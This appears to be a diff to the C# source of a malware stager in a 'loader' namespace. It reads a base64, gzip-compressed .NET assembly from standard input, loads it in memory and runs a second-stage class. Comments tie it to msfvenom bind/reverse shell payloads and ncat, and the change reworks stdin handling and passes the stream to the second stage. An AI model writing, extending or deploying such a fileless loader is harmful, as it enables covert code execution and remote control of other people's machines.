@@ -19,6 +19,7 @@ namespace loader
 
 			IntPtr hStdIn = GetStdHandle(-11);
 			var stdin = new System.IO.StreamReader(new System.IO.FileStream(hStdIn, System.IO.FileAccess.Read, false));
+			//var stdin = new System.IO.StreamReader(System.Console.OpenStandardInput());
 
 			System.Console.WriteLine("READY");
 
@@ -27,10 +28,16 @@ namespace loader
 				String encoded = "";
 				try
 				{
+					// This works for msfvenom bind/reverse shell payloads
+					// but not for nmap ncat
 					encoded = stdin.ReadLine();
+					System.Console.SetIn(stdin);
 				} catch ( Exception e)
                 {
-					encoded = System.Console.ReadLine();
+					// This works for nmap ncat but not for msfvenom payloads.
+					// NOTE: I have no fucking clue why...
+					stdin = new System.IO.StreamReader(System.Console.OpenStandardInput());
+					encoded = stdin.ReadLine();
                 }
 				var compressed = System.Convert.FromBase64String(encoded);
 				var ms = new System.IO.MemoryStream(compressed);
@@ -39,7 +46,7 @@ namespace loader
 				gz.CopyTo(output_ms);
 				var assembly = System.Reflection.Assembly.Load(output_ms.ToArray());
 				var stagetwo = assembly.CreateInstance("stagetwo.StageTwo");
-				stagetwo.GetType().GetMethod("main").Invoke(stagetwo, new object[] { this.GetType().Assembly.Location });
+				stagetwo.GetType().GetMethod("main").Invoke(stagetwo, new object[] { this.GetType().Assembly.Location, stdin });
 			}
 			catch (Exception e)
 			{
